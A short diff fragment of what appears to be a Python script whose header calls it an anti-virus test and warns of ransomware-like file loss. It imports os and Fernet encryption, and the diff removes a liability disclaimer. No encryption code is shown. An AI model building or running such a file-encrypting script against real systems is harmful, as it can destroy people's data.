@@ -2,7 +2,6 @@
 # IMPORTANT: JUST USE THIS FOR TESTING ANTI-VIRUS SOFTWARE """ONLY""" | NOT FOR H@CKING AND R@NSOM #
 # Please note: Although that this is for testing purposes, It may create critical problems or file loss#
 # SO PLEASE USE THIS PYTHON SCRIPT WITH A LOT OF CARE #
-# NOT RESPONSIBLE FOR ANY DAMAGE #
 
 import os
 import cryptography.fernet as cf
